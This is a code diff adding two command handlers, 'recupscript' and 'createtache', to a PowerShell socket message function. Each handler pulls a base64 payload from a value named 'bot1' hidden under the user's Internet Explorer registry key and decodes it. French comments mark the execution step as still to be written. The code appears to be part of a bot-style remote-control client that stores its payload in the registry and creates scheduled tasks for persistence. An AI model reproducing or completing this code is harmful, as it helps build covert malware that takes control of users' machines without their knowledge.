@@ -18,7 +18,30 @@ function global:FRX_Socket-MessageAction{
             #>
 
             }
+        {$_ -match "recupscript"       }{
+            write-host "récupération du script en cours" -ForegroundColor green
+            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
+            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))
 
+            <#
+            Il faut maintenant exploiter la clé pour exécuter la fonction
+
+            #>            
+            
+            
+            }
+        {$_ -match "createtache"       }{
+            write-host "création de la tâche en cours" -ForegroundColor green
+            $convert64 = (get-itemproperty -path "registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" -Name "bot1")."bot1"
+            $Decode=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($convert64))
+
+            <#
+            Il faut maintenant exploiter la clé pour exécuter la fonction
+
+            #>            
+            
+            
+            }
         Default {write-host $message}
     }
 
